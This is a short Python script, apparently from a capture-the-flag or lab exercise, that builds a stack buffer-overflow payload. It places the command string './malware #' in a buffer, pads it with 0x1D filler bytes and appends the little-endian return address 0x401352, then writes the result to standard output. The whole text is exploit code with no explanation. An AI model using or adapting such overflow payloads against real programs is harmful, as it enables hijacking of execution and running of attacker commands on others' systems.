import sys
payload = b'./malware #'+b'0'*0x1D+b'\x52\x13\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)